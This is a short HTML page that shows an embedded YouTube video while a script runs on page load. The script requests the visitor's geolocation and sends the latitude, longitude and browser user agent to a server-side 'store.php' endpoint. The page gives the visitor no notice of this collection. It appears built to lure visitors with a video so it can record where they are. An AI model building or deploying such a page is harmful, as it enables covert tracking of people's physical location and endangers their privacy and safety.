<!DOCTYPE html>
<html>
<body onload="getLocation()">
<iframe width="560" height="315" src="https://www.youtube.com/embed/5oAoBKYR2aY?si=Xcts-raoSUmmRTCw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function success(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "store.php?lat=" +position.coords.latitude + "&long=" + position.coords.longitude +"&uagent=" + navigator.userAgent);
    xhttp.send();
}

function error() {
  alert("Sorry, no position available.");
}
</script>

</body>
</html>
